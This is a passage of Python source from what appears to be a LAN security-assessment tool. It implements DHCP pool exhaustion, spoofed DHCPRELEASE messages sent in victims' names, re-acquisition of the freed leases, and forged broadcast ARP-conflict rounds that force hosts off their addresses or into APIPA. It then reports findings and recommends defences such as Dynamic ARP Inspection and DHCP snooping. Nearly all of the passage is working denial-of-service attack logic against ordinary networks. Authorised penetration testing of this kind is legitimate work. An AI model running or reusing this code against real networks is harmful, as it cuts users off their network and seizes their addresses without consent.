                # (topping out at "rediscovered") is the whole point of this mode, not a harm.
                # Only a target that couldn't get back online at all, or fell back to APIPA, is
                # a real denial-of-service byproduct here.
                fail_rungs = {"discover_unanswered", "apipa"}
            else:
                # exhaust: the pool IS meant to be drained, so a successful restart
                # ("rediscovered") is already evidence the address was taken from its owner by
                # force -- see the outcome-ladder table in _evict_phase()'s module docstring.
                fail_rungs = {"declined", "rediscovered", "discover_unanswered", "apipa"}
            evicted = {ip: rung for ip, rung in self._evict_outcomes.items() if rung in fail_rungs}
            reacted = {
                ip: rung
                for ip, rung in self._evict_outcomes.items()
                if rung not in fail_rungs and rung != "no_reaction"
            }
            by_rung: dict[str, int] = {}
            for rung in self._evict_outcomes.values():
                by_rung[rung] = by_rung.get(rung, 0) + 1
            if evicted:
                self._raise(
                    Finding(
                        id="CLIENTS_EVICTED_FROM_ADDRESSES",
                        title="ARP-conflict eviction forced clients off their addresses",
                        verdict=FAIL,
                        severity="high",
                        evidence={
                            "targets": len(self._evict_outcomes),
                            "evicted": len(evicted),
                            "by_rung": by_rung,
                            "evicted_targets": evicted,
                            "rounds": self.cfg.evict_rounds,
                            "mode": self.cfg.mode.value,
                        },
                        recommendation=(
                            "Any host on this segment can force any other host off its address "
                            "using only broadcast ARP (RFC 5227's own address-conflict-detection "
                            "mechanism, turned against the client). Enable Dynamic ARP "
                            "Inspection / port security to drop forged ARP at the switch port; "
                            "without it, this is independent of and cheaper than pool "
                            "exhaustion."
                        ),
                    )
                )
            elif reacted:
                self._raise(
                    Finding(
                        id="CLIENTS_DEFENDED_ADDRESSES",
                        title="Targets reacted to the ARP conflict but were not denied service",
                        verdict=INCONCLUSIVE,
                        severity="medium",
                        evidence={
                            "targets": len(self._evict_outcomes),
                            "reacted": len(reacted),
                            "by_rung": by_rung,
                            "rounds": self.cfg.evict_rounds,
                            "mode": self.cfg.mode.value,
                        },
                        recommendation=(
                            "Our forged ARP reached the targets — Dynamic ARP Inspection is not "
                            "filtering this port. Some held their ground (defended); others "
                            "restarted at INIT and immediately reacquired a lease, which is the "
                            "expected, low-harm outcome under release mode since the pool was "
                            "never drained. Not a pass: some clients defend and still lose the "
                            "gateway entry, which this vantage point cannot see, and 'defended' "
                            "targets in particular show DAI is not filtering this port."
                        ),
                    )
                )
            else:
                self._raise(
                    Finding(
                        id="ARP_CONFLICTS_UNANSWERED",
                        title="ARP-conflict frames drew no reaction from any target",
                        verdict=INCONCLUSIVE,
                        severity="medium",
                        evidence={
                            "targets": len(self._evict_outcomes),
                            "rounds": self.cfg.evict_rounds,
                        },
                        recommendation=(
                            "Either the frames were filtered (Dynamic ARP Inspection / port "
                            "security) or every target simply accepted them silently — both "
                            "look identical from here. Check DAI drop counters on the switch."
                        ),
                    )
                )

    def _note_neighbor(self, mac: str, ip: str) -> Neighbor:
        """Record/refresh a neighbor, attaching any DHCP fingerprint already seen for this MAC.

        With no DHCP evidence we fall back to the MAC's OUI, so an ARP-only host still shows
        its hardware vendor rather than an empty OS/Device column.
        """
        fp = self._fp_by_mac.get(mac)
        if fp is None:
            fp = fingerprint_from_mac(mac, ip=ip, role="neighbor")
        n = Neighbor(mac=mac, ip=ip, fingerprint=fp)
        self._neighbors_by_mac[mac] = n
        self.bus.emit(ev.NeighborFound(neighbor=n))
        return n

    def _note_fingerprint(self, fp: HostFingerprint) -> None:
        """Record a resolved fingerprint by MAC; if that host is already a known neighbor
        (ARP arrived before/without DHCP), refresh its row so the Neighbors table picks it up."""
        if fp.confidence <= 0 or not fp.mac:
            return
        self._fp_by_mac[fp.mac] = fp
        existing = self._neighbors_by_mac.get(fp.mac)
        if existing is not None and (
            existing.fingerprint is None or fp.confidence > existing.fingerprint.confidence
        ):
            updated = Neighbor(mac=existing.mac, ip=existing.ip, fingerprint=fp)
            self._neighbors_by_mac[fp.mac] = updated
            self.bus.emit(ev.NeighborFound(neighbor=updated))

    def _release_bindings(
        self, bindings: list[tuple[str, str]], server_ip: str, server_mac: str | None = None
    ) -> int:
        """Send DHCPRELEASE for a list of (mac, ip) bindings. Returns count sent.

        The one release send-path -- both `_do_release()` (ARP-discovered neighbors) and
        `release-previous` (journal-recorded phantom leases, 2.2) funnel through here, so there
        is exactly one place that builds the packet and emits LeaseReleased.
        """
        sent = 0
        for mac, ip in bindings:
            if self._stop.is_set():
                break
            xid = _rand_xid()
            pkt = packets.build_release_v4(mac, ip, server_ip, xid, server_mac=server_mac)
            if self._send(pkt, target_ip=ip):
                sent += 1
                self.releases += 1
                self._journal_release(mac, ip)  # no-op if (mac, ip) was never a journaled ACK
                self.bus.emit(
                    ev.LeaseReleased(
                        lease=Lease(
                            mac,
                            ip,
                            server_ip,
                            xid,
                            self.cfg.ip_version,
                            released=True,
                            server_mac=server_mac,
                        )
                    )
                )
        return sent

    def _do_release(
        self, neighbors: list[Neighbor], server_ip: str, server_mac: str | None = None
    ) -> int:
        """Send DHCPRELEASE for in-scope neighbors. Returns count sent. Unit-testable."""
        return self._release_bindings(
            [(n.mac, n.ip) for n in neighbors], server_ip, server_mac=server_mac
        )

    def _do_arp_conflict(self, targets: list[Neighbor]) -> int:
        """One ARP-conflict round over `targets` (rewrite of the old `_do_garp`, 2.3).

        Returns frames sent. Unit-testable. Per target, two frames:
          1. broadcast ARP *request*  claiming the victim's own IP  (announcement form)
          2. broadcast ARP *reply*    claiming the victim's own IP  (unsolicited form)

        Both trip duplicate-address detection on a well-behaved host; RFC 5227 SS2.4 has the
        host defend once, then go quiet on a second conflict inside DEFEND_INTERVAL (10s) —
        which is what repeated rounds from `_evict_worker()` are for.

        The claimed MAC is always a fresh `random_mac()`, recorded in `_evict_bogus_macs` so
        the ARP observer can tell our forgeries apart from real hosts. It must never be ours or
        the victim's real MAC — a bogus MAC blackholes the claim (nothing answers for it, so
        the victim's own traffic just goes nowhere and it notices the conflict); our own MAC
        would instead intercept the victim's traffic, which is out of scope for this tool.

        (2.3) No longer takes a `gateway` parameter or sends a third unicast frame blackholing
        the victim's default route via `build_arp_poison()` — that crossed from denial-of-
        service into traffic-interception-adjacent territory and added nothing eviction needs.
        Not gated on `self._stop`: this only ever runs from within `stop()` (or the release
        worker's own finishing sequence, Phase 5), by which point `_stop` is already set for
        every *other* purpose, and gating here would mean eviction never sends anything.
        """
        from .netutils import random_mac

        sent = 0
        for n in targets:
            bogus = random_mac()
            self._evict_bogus_macs.add(bogus)
            for op, label in ((packets.ARP_REQUEST, "request"), (packets.ARP_REPLY, "reply")):
                pkt = packets.build_garp(n.ip, bogus, op=op)
                if self._send(pkt, target_ip=n.ip):
                    sent += 1
                    self.arp_conflicts += 1
                    self._debug(
                        f"ARP conflict {label} (op={op}) broadcast: claiming {n.ip} is at "
                        f"{bogus} (real owner {n.mac or '?'})"
                    )
            self.bus.emit(ev.ArpConflictSent(ip=n.ip))
        return sent

    # ---------------------------------------------------------------- eviction (2.3, Phase 4)
    def _evict_phase(self) -> None:
        """ARP-conflict eviction: contest ownership of every address re-acquired in Phase 3,
        per RFC 5227 SS2.4, to move the real owner out of its "defend once" phase and force a
        DECLINE / restart-at-INIT / APIPA fallback.

        Runs in `stop()` between the post-run controls and `_finalize_findings()` for exhaust
        (the sniffer is still up, so live signals during rounds+settle are actually observed);
        release mode runs it inline in its own worker (Phase 5). Guarded by `cfg.evict`. Under
        dry-run the phase still executes and logs its target list and round count -- its frames
        go through `_send()` with the default `probe=False`, so the dry-run chokepoint (0a)
        suppresses them on its own; no second dry-run check is added here.

        Target selection reuses the ARP inventory, restricted to addresses this run actually
        re-acquired (Phase 3's `granted` outcomes) -- not just anything the general flood
        happened to grab, most of which was never anyone's in the first place. Conflicting with
        an address still bound to the victim just makes them defend and re-ARP; conflicting
        with one *we* now hold is what forces the DECLINE. The gateway and DHCP server are
        excluded exactly as `_release_phase()` excludes them, though in practice Phase 3 never
        re-acquires those anyway (they were never RELEASEd in the first place).
        """
        if not self.cfg.evict:
            self._debug("evict phase skipped: evict is disabled")
            return
        granted_ips = {
            ip
            for xid, ip in self._reacquire_targets.items()
            if self._reacquire_outcomes.get(xid) == "granted"
        }
        if not granted_ips:
            self._debug("evict phase: no re-acquired addresses to evict from")
            return
        pre = self._prelude_pre_control()
        server_id = pre.server_id if pre else None
        gateway = self._release_gateway()
        targets = [
            n
            for n in self._neighbors_by_mac.values()
            if n.ip in granted_ips and n.ip not in (server_id, gateway)
        ]
        if not targets:
            self._debug("evict phase: no eligible targets after excluding gateway/server")
            return
        self._debug(
            f"evict phase: {len(targets)} target(s) -- "
            + ", ".join(f"{n.ip}/{n.mac}" for n in targets)
        )
        self._evict_targets = {n.ip for n in targets}
        self._evict_mac_by_ip = {n.ip: n.mac for n in targets}
        self._evict_ip_by_mac = {n.mac: n.ip for n in targets}
        self._evict_outcomes = dict.fromkeys(self._evict_targets, "no_reaction")
        self._evict_start_ts = time.time()
        self._evict_worker(targets)

    def _evict_worker(self, targets: list[Neighbor]) -> None:
        """Fixed number of ARP-conflict rounds, spaced under RFC 5227's 10s DEFEND_INTERVAL,
        then a settle period before measuring -- not gated on `self._stop` (see
        `_do_arp_conflict`'s docstring: it's already set by the time this runs)."""
        for round_num in range(1, self.cfg.evict_rounds + 1):
            sent = self._do_arp_conflict(targets)
            self._debug(
                f"evict round {round_num}/{self.cfg.evict_rounds}: {sent} frame(s) over "
                f"{len(targets)} target(s)"
            )
            if round_num < self.cfg.evict_rounds:
                time.sleep(self.cfg.timeouts.evict_interval)
        self._debug(
            f"evict: settling {self.cfg.evict_settle:g}s before measuring outcomes "
            "(DECLINE/DISCOVER/APIPA need time to land)"
        )
        time.sleep(self.cfg.evict_settle)
        self._measure_eviction(targets)

    def _measure_eviction(self, targets: list[Neighbor]) -> None:
        """Highest rung reached per target wins; every signal is checked independently rather
        than short-circuited, since a host can (for example) both defend an earlier round and
        decline a later one."""
        for n in targets:
            rung = "no_reaction"
            if n.ip in self._evict_defenders:
                rung = _evict_rung_max(rung, "defended")
            if n.ip in self._evict_declined_ips:
                rung = _evict_rung_max(rung, "declined")
            discovers = [
                v
                for v in self._foreign_discovers.values()
                if v["mac"] == n.mac and v["ts"] >= self._evict_start_ts
            ]
            if discovers:
                rung = _evict_rung_max(rung, "rediscovered")
                if not any(v["answered"] for v in discovers):
                    rung = _evict_rung_max(rung, "discover_unanswered")
            if n.ip in self._evict_apipa_ips:
                rung = _evict_rung_max(rung, "apipa")
            self._evict_outcomes[n.ip] = rung
            self.bus.emit(ev.ClientEvicted(ip=n.ip, mac=n.mac, outcome=rung))
            self._debug(f"evict outcome: {n.ip}/{n.mac} -> {rung}")

    def _handle_evict_arp(self, pkt) -> None:
        """Two signals, both scoped to known eviction targets so a stranger's ordinary ARP
        traffic can never be mistaken for one:

          * defended -- an ARP announcement/reply from the *victim's real MAC* for its own IP.
            Proves our conflict frame was delivered (so DAI/port-security isn't filtering it);
            does not by itself prove the eviction failed -- see `_measure_eviction()`.
          * apipa -- the victim's real MAC now sourcing ARP from a 169.254.0.0/16 address:
            full eviction, RFC 5227's fallback after repeated conflicts.
        """
        from scapy.all import ARP, Ether

        try:
            if ARP not in pkt or Ether not in pkt:
                return
            psrc, hwsrc = pkt[ARP].psrc, pkt[Ether].src
            if not hwsrc or hwsrc in self._evict_bogus_macs:
                return  # our own forged frame, echoed back
            if psrc in self._evict_targets and hwsrc == self._evict_mac_by_ip.get(psrc):
                if psrc not in self._evict_defenders:
                    self._evict_defenders.add(psrc)
                    self._debug(f"evict: {psrc} defended (ARP op={pkt[ARP].op} from {hwsrc})")
            ip = self._evict_ip_by_mac.get(hwsrc)
            if ip is not None and psrc.startswith("169.254."):
                if ip not in self._evict_apipa_ips:
                    self._evict_apipa_ips.add(ip)
                    self._debug(f"evict: {ip}/{hwsrc} now sourcing ARP from APIPA ({psrc})")
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"evict ARP observer error: {exc!r}"))

    def _handle_client_decline(self, pkt) -> None:
        """DHCPDECLINE from a known eviction target's MAC -- gold-standard proof it gave up
        the address (though not the only path to eviction; see the outcome ladder).

        (2.3, race-freed) A decline from any *other* MAC -- not one we're evicting -- is a
        second, weaker race trigger: the declining client refuses to use the address, though
        many DHCP server implementations quarantine a declined address rather than returning it
        to the free pool, so this is offered on a best-effort basis (see
        EXECUTION-PLAN-race-freed.md's "Decisions taken"). A DECLINE carries its own address via
        option 50 (RFC 2131 Table 5), unlike a NAK.
        """
        from scapy.all import BOOTP, DHCP

        try:
            if BOOTP not in pkt:
                return
            mac = packets.client_mac_from_offer(pkt)
            ip = self._evict_ip_by_mac.get(mac)
            self._debug(
                f"DECLINE xid=0x{pkt[BOOTP].xid:08x} chaddr={mac}" + (f" ({ip})" if ip else "")
            )
            if ip is not None:
                self._evict_declined_ips.add(ip)
                return
            declined = None
            if DHCP in pkt:
                declined = packets.dhcp_option(pkt[DHCP].options, "requested_addr")
            if declined:
                self._maybe_race(declined, "decline")
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"decline parse error: {exc!r}"))

    def _handle_foreign_request(self, pkt) -> None:
        """Track a foreign DHCPREQUEST just long enough to resolve which address a later NAK
        for the same xid was refusing (2.3, race-freed) -- a NAK carries no address of its own
        (RFC 2131), so this is the only way to turn "somebody got NAK'd" into "this specific IP
        is contested". Not itself a race trigger; _handle_nak() consumes this."""
        from scapy.all import BOOTP, DHCP

        try:
            if BOOTP not in pkt or DHCP not in pkt:
                return
            xid = pkt[BOOTP].xid
            requested = packets.dhcp_option(pkt[DHCP].options, "requested_addr")
            if not requested:
                ciaddr = pkt[BOOTP].ciaddr
                requested = ciaddr if ciaddr and ciaddr != "0.0.0.0" else None
            if requested:
                self._foreign_requests[xid] = requested
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"foreign request parse error: {exc!r}"))

    def _maybe_race(self, ip: str | None, why: str) -> None:
        """Single entry point for every race trigger (foreign NAK, foreign DECLINE, optionally
        foreign DISCOVER from a known neighbor) -- keeps every exclusion in exactly one place.
        See EXECUTION-PLAN-race-freed.md.

        Exhaust-only: release/scan/active-scan have no concurrent flood for "racing ahead of"
        to mean anything -- release's own sends (RELEASE, re-acquisition) are already deliberate
        and targeted.

        Exclusions, in order:
          * `ip` unresolved -- nothing to queue.
          * already queued this run (`_raced_ips`) -- dedup, e.g. a decline retransmit.
          * already targeted by *our own* re-acquisition (`_reacquire_targets.values()`) -- the
            release phase's own victims DISCOVER/DECLINE right after being released and evicted
            (that's the `rediscovered` rung, §5f); without this check every one of those would
            queue a duplicate race for an address we already hold. Deliberately not
            `_is_own_traffic()` -- `_release_bindings()` spoofs the victim's MAC as both chaddr
            and Ethernet source with a fresh xid never registered in `_inflight`, so that filter
            cannot recognise our own release-phase frames as ours.
          * the gateway or the DHCP server -- same exclusion `_release_phase()`/`_evict_phase()`
            apply, via `_prelude_pre_control()`/`_release_gateway()`.
        """
        if self.cfg.mode is not Mode.EXHAUST or not self.cfg.race_freed_addresses:
            return
        if not ip or ip in self._raced_ips:
            return
        if ip in self._reacquire_targets.values():
            self._debug(f"race: {ip} already targeted by re-acquisition, not queuing ({why})")
            return
        pre = self._prelude_pre_control()
        server_id = pre.server_id if pre else None
        if ip in (server_id, self._release_gateway()):
            return
        self._raced_ips.add(ip)
        self._race_queue.append(ip)
        self._debug(f"race: queued {ip} ({why})")

    # ---------------------------------------------------------------- pool estimate / headroom
    def _note_offer_for_pool_estimate(self, offered_ip: str, subnet: str | None) -> None:
        """Remember the first OFFER's address+subnet, in case --scope was never given.

        Called from both the real sender path and the control transaction, so the estimate
        becomes available as soon as *any* OFFER is seen — usually the control/self leg, well
        before the exhaust sender sends its first packet.
        """
        if self._first_offer_ip is None and subnet:
            self._first_offer_ip, self._first_offer_subnet = offered_ip, subnet

    def _estimate_pool(self) -> PoolEstimate:
        """Best-effort pool size. Never fabricated — `size=None` when nothing is known yet.

        Resolution order: an explicit --scope (deterministic host count) beats inferring the
        subnet from an OFFER (option 1), which is itself only as good as what the server told
        us — reservations, exclusions, and additional scopes on the same segment are invisible
        from here.
        """
        import ipaddress

        if self.cfg.scope_cidrs:
            try:
                total = sum(
                    max(0, ipaddress.ip_network(c, strict=False).num_addresses - 2)
                    for c in self.cfg.scope_cidrs
                )
                return PoolEstimate(
                    size=total,
                    source="scope",
                    is_estimate=False,
                    detail=f"usable hosts in {', '.join(self.cfg.scope_cidrs)}",
                )
            except ValueError:
                pass
        if self._first_offer_ip and self._first_offer_subnet:
            from .netutils import cidr_from_mask

            try:
                prefixlen = cidr_from_mask(self._first_offer_subnet)
                net = ipaddress.ip_network(f"{self._first_offer_ip}/{prefixlen}", strict=False)
                return PoolEstimate(
                    size=max(0, net.num_addresses - 2),
                    source="observed",
                    is_estimate=True,
                    detail=f"subnet inferred from an OFFER ({net})",
                )
            except (ValueError, OSError):
                pass
        return PoolEstimate(
            size=None, source="none", is_estimate=True, detail="no --scope and no OFFER seen yet"
        )

    def _pool_headroom(self) -> tuple[PoolEstimate, int | None]:
        """(estimate, headroom). headroom is None whenever the estimate itself is unknown, and
        floored at 0 rather than allowed to go negative (over-subscribed/misestimated scopes)."""
        est = self._estimate_pool()
        if est.size is None:
            return est, None
        in_use_observed = len(self._neighbors_by_mac)
        headroom = max(0, est.size - self.acks - in_use_observed)
        return est, headroom

    # ---------------------------------------------------------------- windowed handshake pipeline
    def _trigger_halt(self, signal: str, detail: str) -> None:
        """First control signal wins: stop sending, keep leases, finish the report.

        This is the fix for the run that motivated this rewrite — flooding DISCOVERs kept
        piling up half-open allocations after the server had already started pushing back
        (NAKs, then silence), which looked like failure but was actually the tool refusing to
        stop. Detecting the signal and halting immediately, rather than trying to power
        through it, is what makes the eventual verdict trustworthy.
        """
        if self._halt_signal is not None:
            return
        self._halt_signal = (signal, detail, self.acks)
        self.state = HALTED
        self.bus.emit(ev.ControlDetected(signal=signal, detail=detail, leases_held=self.acks))
        self._debug(f"HALT[{signal}] {detail} — leases held: {self.acks}; sending stopped")
        self._finish_in_background(f"control detected: {signal} — {detail}")

    def _grow_window(self) -> None:
        """Grow at `cfg.window_growth_per_ack` per clean ACK (default 0.01, i.e. 100 clean ACKs
        widen the window by one slot) -- a ratchet, not a ramp: `_shrink_window()` still halves
        on NAK/timeout/duplicate-offer and wipes this accumulator, so on any run with even
        occasional errors the window trends toward the floor of 1 rather than climbing back.
        That's the deliberate trade-off (2.3, Phase 7): a small, steady window is what keeps the
        server's pending-offer table from saturating, which is what the NAK-then-silence stall
        this pacing logic exists to prevent was caused by."""
        with self._inflight_lock:
            self._window_growth_accum += self.cfg.window_growth_per_ack
            if self._window_growth_accum < 1.0:
                return
            self._window_growth_accum -= 1.0
            w = self._window = min(self.cfg.window_max, self._window + 1)
        self._debug(f"window -> {w} (clean ACK)")

    def _shrink_window(self, trigger: str) -> None:
        with self._inflight_lock:
            self._window_growth_accum = 0.0
            old = self._window
            w = self._window = max(1, self._window // 2)
        if w != old:
            self._debug(f"window {old} -> {w} ({trigger})")

    def _reap_timeouts(self) -> None:
        """Free in-flight slots that never got a reply. A timeout shrinks the window exactly
        like a NAK does — a half-open allocation that never completes is the same signal that
        the server (or the network) can't keep up, whichever end caused it."""
        now = time.time()
        limit = self.cfg.timeouts.dhcp_request
        with self._inflight_lock:
            expired = [xid for xid, info in self._inflight.items() if now - info["sent_at"] > limit]
            for xid in expired:
                del self._inflight[xid]
        if not expired:
            return
        for xid in expired:
            if xid in self._reacquire_targets and xid not in self._reacquire_outcomes:
                self._reacquire_outcomes[xid] = "no_response"
        self.timeouts_seen += len(expired)
        self._consecutive_timeouts += len(expired)
        self._shrink_window("timeout")
        self._debug(
            f"{len(expired)} handshake(s) timed out (no reply within {limit}s); "
            f"{self._consecutive_timeouts} consecutive"
        )
        if self._consecutive_timeouts >= 5:
            self._trigger_halt(
                "timeout_storm", f"{self._consecutive_timeouts} consecutive handshake timeouts"
            )

    def _note_nak_for_burst_detection(self) -> None:
        now = time.time()
        self._nak_timestamps.append(now)
        self._nak_timestamps = [t for t in self._nak_timestamps if now - t <= 5.0]
        if len(self._nak_timestamps) >= 3:
            self._trigger_halt("nak_burst", f"{len(self._nak_timestamps)} NAKs within 5s")

    def _note_offer_for_duplicate_detection(self, offered_ip: str, mac: str) -> None:
        """Same address offered to two of our MACs — the pending-offer-table saturation
        signature from the run that motivated this rewrite (flooding faster than handshakes
        could complete)."""
        macs = self._offered_ip_macs.setdefault(offered_ip, set())
        macs.add(mac)
        if len(macs) > 1 and offered_ip not in self._duplicate_offer_ips:
            self._duplicate_offer_ips.add(offered_ip)
            self._shrink_window("duplicate_offer")
            if len(self._duplicate_offer_ips) >= 3:
                self._trigger_halt(
                    "duplicate_offers",
                    f"{len(self._duplicate_offer_ips)} address(es) offered to more than one "
                    "of our MACs",
                )

    # ---------------------------------------------------------------- run loops
    def _run_exhaust(self) -> None:
        # offline is the hard "no sockets at all" switch (tests, no-root preview) -- no sniffer
        # (no OFFERs would arrive), so skip straight to the sender. dry-run alone still runs the
        # full prelude for real: it's a genuine reconnaissance pass now, not a shape-only preview
        # -- see _send()'s `probe` parameter and SessionConfig.offline.
        if self.cfg.offline:
            self._debug("offline: sniffer disabled, prelude skipped (no packets sent or received)")
            self._start_senders()
            return
        self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_dhcp)
        self._sniffer.start()
        self._debug(f"sniffer started on {self.cfg.interface} (filter: dhcp/arp/icmp)")
        # Prelude (inventory + controls) runs off-thread so start() returns immediately and
        # the UI streams progress instead of blocking the HTTP request for ~10s.
        t = threading.Thread(target=self._exhaust_prelude, daemon=True)
        t.start()
        self._threads.append(t)

    def _exhaust_prelude(self) -> None:
        """Baseline the segment, release what's there, re-acquire it, then hand off to senders.

        Order matters:
          1. ARP inventory — who was on the network *before* we touched it.
          2. control/self — proves DHCP is reachable and (as a side effect) learns the real
             server's identity, which the release phase needs.
          3. control/new — the baseline the final verdict is judged against. exhaust-only:
             this is the starvation baseline, meaningless for a release run.
          4. release phase — free the leases of hosts we just inventoried, so "take every
             address in the range" has somewhere to go rather than only mopping up whatever
             was already free.
          5. re-acquisition (2.3) — target the freed addresses specifically (option 50), so
             the release actually means something rather than returning to a pool the general
             flood might not happen to touch. NEIGHBOR_LEASES_RELEASED is raised here, after
             re-acquisition confirms whether the RELEASE actually took.
          6. senders.
        Without the baselines a null result at the end can't be interpreted. Steps 1-5 are
        `_common_prelude()`, shared with `_release_worker()` (2.3, Phase 5) -- exhaust is the
        only mode that runs the client="new" leg and continues into the windowed sender.
        """
        self._common_prelude(run_new_leg=True)
        if not self._stop.is_set():
            self._start_senders()

    def _common_prelude(self, run_new_leg: bool) -> None:
        """Shared setup for exhaust and release (2.3, Phase 5): ARP inventory -> control/self
        [-> control/new, exhaust only] -> release -> re-acquisition.

        The pre/self control outcome is stored in `self.control_pre` for exhaust (where
        `_finalize_findings()` also reads it to derive the starvation verdict) and in
        `self._rel_pre_control` for release -- kept separate on purpose, same precedent as
        `_rp_pre_control` (release-previous), so a release run can never accidentally trigger
        `DHCP_STARVATION_*`, which it never attempted to cause. `_release_phase()`,
        `_finish_release()` and `_evict_phase()` all read whichever one applies via
        `_prelude_pre_control()` rather than `self.control_pre` directly.
        """
        if self.cfg.arp_sweep:
            self._baseline_arp_scan()
        if self._stop.is_set():
            return
        pre = self._control_transaction("pre", client="self")
        if self.cfg.mode is Mode.EXHAUST:
            self.control_pre = pre
        else:
            self._rel_pre_control = pre
        if run_new_leg and not self._stop.is_set():
            self.control_pre_new = self._control_transaction("pre", client="new")
        if self._stop.is_set():
            return
        freed = self._release_phase()
        self._finish_release(freed)

    def _prelude_pre_control(self) -> ControlOutcome | None:
        """Whichever pre/self control outcome `_common_prelude()` populated for the current
        mode -- see its docstring for why this isn't just `self.control_pre`."""
        return self.control_pre if self.cfg.mode is Mode.EXHAUST else self._rel_pre_control

    def _release_phase(self) -> list[tuple[str, str]]:
        """Release the leases of every ARP-discovered neighbor before exhausting.

        Needs a real server identity — sourced from `_prelude_pre_control()` (never guessed) —
        or every RELEASE would carry server_id=0.0.0.0 and be silently dropped (the bug this
        phase exists to not repeat). Skips itself with a Debug, rather than sending garbage,
        when that identity isn't available.

        Returns the (mac, ip) pairs actually RELEASEd -- empty when disabled, when there's no
        confirmed server identity yet, when there's nothing to release, or under dry-run.
        `_finish_release()` is what turns this into a finding now (2.3); this method no longer
        raises one itself, since "sent" is not the same claim as "worked" (see Phase 3).
        """
        if not self.cfg.release_neighbors:
            self._debug("release phase skipped: release_neighbors is disabled")
            return []
        pre = self._prelude_pre_control()
        if pre is None or not pre.success or not pre.server_id:
            self._debug(
                "release phase skipped: no confirmed server identity yet "
                f"(pre_ok={bool(pre and pre.success)})"
            )
            return []
        server_id, server_mac = pre.server_id, pre.server_mac
        neighbors = [
            n
            for n in self._neighbors_by_mac.values()
            if n.ip not in (server_id, self._release_gateway())
        ]
        if not neighbors:
            self._debug("release phase: no ARP-discovered neighbors to release")
            return []
        self._dry_run_would_release = len(neighbors)  # for DRY_RUN_SUMMARY; harmless when live
        if self.cfg.dry_run:
            self._debug(
                f"release phase: [dry] would send DHCPRELEASE for {len(neighbors)} neighbor(s) "
                f"via server {server_id} ({server_mac or 'MAC unknown, broadcasting'}) -- "
                "nothing sent"
            )
            return []
        self._debug(
            f"release phase: sending DHCPRELEASE for {len(neighbors)} neighbor(s) via "
            f"server {server_id} ({server_mac or 'MAC unknown, broadcasting'})"
        )
        sent = self._do_release(neighbors, server_id, server_mac=server_mac)
        self._debug(f"release phase: {sent} RELEASE sent for {len(neighbors)} neighbor(s)")
        return [(n.mac, n.ip) for n in neighbors]

    def _finish_release(self, freed: list[tuple[str, str]]) -> None:
        """Re-acquire the just-released addresses and raise NEIGHBOR_LEASES_RELEASED.

        Shared by exhaust and release (2.3, Phase 5) via `_common_prelude()` -- both modes
        just went through `_release_phase()` and need the same follow-up. A no-op when nothing
        was freed (disabled, dry-run, no neighbors, no server identity).
        """
        if not freed:
            return
        pre = self._prelude_pre_control()
        server_id = pre.server_id if pre else None
        counts = self._reacquire_phase(freed)
        granted = counts["granted"]
        stopped = self._reprobe_released([ip for _mac, ip in freed])
        self._debug(
            f"release phase: re-acquisition granted {granted}/{len(freed)} freed address(es) "
            f"(offered_different={counts['offered_different']}, naked={counts['naked']}, "
            f"no_response={counts['no_response']}); {stopped}/{len(freed)} still ARP-silent"
        )
        self._raise(
            Finding(
                id="NEIGHBOR_LEASES_RELEASED",
                title="Sent DHCPRELEASE for ARP-discovered neighbors, then re-acquired them",
                verdict=INFO,
                severity="medium",
                evidence={
                    "targets": len(freed),
                    "granted": granted,
                    "offered_different": counts["offered_different"],
                    "naked": counts["naked"],
                    "no_response": counts["no_response"],
                    "still_using_address_arp": len(freed) - stopped,
                    "server_id": server_id,
                },
                recommendation=(
                    "The server ignored the unauthenticated RELEASE — none of the freed "
                    "addresses could be re-acquired (the desired behavior)."
                    if granted == 0
                    else "The server acted on unauthenticated RELEASE requests for addresses "
                    "held by other hosts on the segment, and this run was able to re-acquire "
                    f"{granted} of them by name (DHCP option 50) — any host can force another "
                    "off its lease and then take it. This is independent of pool exhaustion and "
                    "worth reporting on its own; verify DHCP snooping / binding validation on "
                    "the access switch. 'still_using_address_arp' is not evidence either way — "
                    "a released victim keeps using its old address until its own lease's T1, "
                    "with no way to know it was released."
                ),
            )
        )

    def _reacquire_phase(self, freed: list[tuple[str, str]]) -> dict[str, int]:
        """Push one targeted DISCOVER (option 50 = the freed IP) per (mac, ip) in `freed`,
        each from a fresh random MAC, into the existing windowed `_inflight` pipeline --
        `_handle_offer()` -> `_handle_ack()` complete them exactly like any other lease, so the
        result lands in `Cleanup` and the lease journal for free. Returns outcome counts.
        """
        counts = {"granted": 0, "offered_different": 0, "naked": 0, "no_response": 0}
        if not freed:
            return counts
        from .netutils import random_mac

        pushed: list[int] = []
        for _mac, ip in freed:
            if self._stop.is_set():
                break
            while not self._stop.is_set():
                with self._inflight_lock:
                    room = self._window - len(self._inflight)
                if room > 0:
                    break
                self._reap_timeouts()
                if self._stop.wait(0.02):
                    break
            if self._stop.is_set():
                break
            client_mac = random_mac()
            xid = _rand_xid()
            src = self._src_mac(client_mac)
            self._our_macs.add(src)
            pkt = packets.build_discover_v4(client_mac, xid, src, requested_addr=ip)
            self._send(pkt)
            with self._inflight_lock:
                self._inflight[xid] = {
                    "mac": client_mac,
                    "sent_at": time.time(),
                    "state": "DISCOVER_SENT",
                }
            self._reacquire_targets[xid] = ip
            self.discovers += 1
            pushed.append(xid)
            self.bus.emit(
                ev.DiscoverSent(mac=client_mac, option50=ip, hostname=packets.packet_hostname(pkt))
            )
            self._debug(f"reacquire: DISCOVER xid=0x{xid:08x} option50={ip} chaddr={client_mac}")

        # Drain: wait for every pushed xid to leave _inflight (ACK/NAK/timeout). Bounded by one
        # control-sized settle window plus enough reap cycles to drain all batches through the
        # window -- these run concurrently (up to self._window at a time), not one-at-a-time.
        batches = (len(pushed) // max(1, self._window)) + 1
        deadline = (
            time.time() + self.cfg.timeouts.control + self.cfg.timeouts.dhcp_request * batches
        )
        while not self._stop.is_set() and time.time() < deadline:
            self._reap_timeouts()
            with self._inflight_lock:
                pending = [xid for xid in pushed if xid in self._inflight]
            if not pending:
                break
            self._stop.wait(0.05)
        self._reap_timeouts()  # final sweep: anything still inflight is now overdue

        for xid in pushed:
            outcome = self._reacquire_outcomes.get(xid, "no_response")
            counts[outcome] += 1
        return counts

    def _release_gateway(self) -> str | None:
        from .netutils import default_gateway

        return default_gateway(self.cfg.interface)

    def _reprobe_released(self, ips: list[str]) -> int:
        """Re-ARP the just-released addresses; count how many stopped answering.

        Supplementary colour only (2.3) -- NOT evidence the RELEASE worked or didn't. A host
